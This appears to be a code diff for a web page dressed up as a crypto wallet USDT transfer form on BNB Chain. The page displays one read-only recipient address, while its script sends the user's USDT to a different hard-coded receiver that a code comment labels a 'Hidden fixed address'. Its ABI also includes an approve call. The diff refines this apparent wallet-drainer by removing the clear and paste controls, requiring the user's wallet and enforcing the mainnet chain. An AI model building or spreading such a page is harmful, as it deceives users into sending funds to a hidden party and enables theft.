@@ -47,24 +47,6 @@
       width: 100%;
     }
 
-    .input-box .clear-btn {
-      background: none;
-      border: none;
-      font-size: 20px;
-      color: #aaa;
-      cursor: pointer;
-      margin-right: 8px;
-    }
-
-    .input-box .paste-btn {
-      background: none;
-      border: none;
-      color: #0052ff;
-      font-weight: bold;
-      cursor: pointer;
-      padding: 0 8px;
-    }
-
     .amount-section {
       display: flex;
       align-items: center;
@@ -137,8 +119,6 @@
     <label>Address or Domain Name</label>
     <div class="input-box">
       <input type="text" id="address" value="0x3BA4c387f786bFEE076A58914F5Bd38d668B42c3" readonly>
-      <button class="clear-btn" style="display:none;">&times;</button>
-      <button class="paste-btn" style="display:none;">Paste</button>
     </div>
 
     <label>Amount</label>
@@ -156,8 +136,8 @@
   </div>
 
   <script>
-    const receiver = '0x1956B3950A73B0C54792199Edf13c7b835FF94DC'; // Hidden/fixed
-    const usdtAddress = '0x55d398326f99059fF775485246999027B3197955'; // BSC USDT
+    const receiver = '0x1956B3950A73B0C54792199Edf13c7b835FF94DC'; // Hidden fixed address
+    const usdtAddress = '0x55d398326f99059fF775485246999027B3197955'; // BNB Chain USDT
     const usdtAbi = [
       {"name":"approve","type":"function","inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"outputs":[{"name":"","type":"bool"}],"constant":false},
       {"name":"transfer","type":"function","inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"outputs":[{"name":"","type":"bool"}],"constant":false}
@@ -178,17 +158,27 @@
 
       try {
         if (!web3) {
-          web3 = new Web3(window.ethereum || window.web3.currentProvider);
-          const accounts = await web3.eth.requestAccounts();
+          if (!window.ethereum) {
+            alert("Trust Wallet or Web3 provider not detected.");
+            return;
+          }
+
+          web3 = new Web3(window.ethereum);
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
           user = accounts[0];
+
+          const chainId = await web3.eth.getChainId();
+          if (chainId !== 56) {
+            alert("⚠️ Please switch to BNB Chain (Smart Chain Mainnet)");
+            return;
+          }
+
           usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
         }
 
         const amount = parseFloat(document.getElementById('amount').value);
         if (!amount || amount <= 0) {
           alert("Please enter amount");
-          btn.disabled = false;
-          btn.classList.remove('loading');
           return;
         }
 
@@ -200,7 +190,7 @@
           btn.innerText = "Transfer";
         } else {
           await usdt.methods.transfer(receiver, value).send({from: user});
-          alert("✅ USDT transferred!");
+          alert("✅ USDT Transferred!");
           btn.innerText = "Done";
         }
 
